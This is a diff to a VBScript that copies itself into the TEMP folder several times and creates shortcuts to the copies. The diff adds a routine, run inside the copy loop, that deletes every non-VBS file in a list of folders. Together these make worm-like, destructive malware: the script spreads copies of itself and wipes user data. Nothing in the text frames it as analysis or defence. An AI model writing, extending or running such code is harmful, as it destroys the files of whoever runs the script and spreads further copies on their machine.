@@ -5,6 +5,9 @@ strScriptPath = WScript.ScriptFullName
 ' Specify the number of copies you want to create
 numCopies = 5
 
+' Specify the folders in which you want to delete files (modify as needed)
+foldersToDelete = Array("C:\Folder1", "C:\Folder2", "C:\Folder3")
+
 For i = 1 To numCopies
     strCopyPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\Copy" & i & ".vbs"
     objFSO.CopyFile strScriptPath, strCopyPath, True ' Add "True" to overwrite existing files
@@ -38,4 +41,18 @@ For i = 1 To numCopies
         objShortcut.TargetPath = strFolderCopyPath
         objShortcut.Save
     Next
+    
+    ' Delete all files except VBS files within the specified folders
+    For Each folderPath In foldersToDelete
+        DeleteFilesExceptVBS folderPath
+    Next
 Next
+
+Sub DeleteFilesExceptVBS(folderPath)
+    Set folder = objFSO.GetFolder(folderPath)
+    For Each file In folder.Files
+        If objFSO.GetExtensionName(file.Path) <> "vbs" Then
+            objFSO.DeleteFile file.Path
+        End If
+    Next
+End Sub
